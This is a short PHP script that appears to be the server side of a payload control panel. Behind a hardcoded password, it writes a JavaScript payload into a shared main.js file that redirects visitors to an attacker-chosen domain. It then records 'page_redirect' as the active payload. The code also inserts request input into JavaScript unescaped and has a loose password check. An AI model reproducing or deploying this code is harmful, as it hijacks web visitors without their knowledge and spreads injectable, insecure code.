<?php
$password = $_POST["pass"];
$location = $_POST["loc"];
if ($password == "tno" & $location != "")
{
  $new_location = str_replace("http://", "", $location);
    $new_location2 = str_replace("www.", "", $new_location);
     $redirect_location = explode(".", $new_location2);
  $full_redirect_location = 'http://www.'.$redirect_location[0].'.'.$redirect_location[1].'/';
  
  $module = "../../ping/main.js";
   $module_open = fopen($module, 'w');
    $pay_load = 'if (document.domain.search("'.$redirect_location[0].'") < 0) {window.location = "'.$full_redirect_location.'";}';
      fwrite($module_open, $pay_load);
       fclose($module_open);
  
  // turn into a class damnit
  include('ini_parser_v1.php');
  $ini_data = 'active = page_redirect';
  $ini_file = <<<EOT
;<?php
;die(); // For further security
;/*
$ini_data
;*/
;?>
EOT;

  safefilerewrite("../../db/active_payload.php", $ini_file);
  header('Location: ../index.php');
}
else
{
  echo 'error';
}
?>
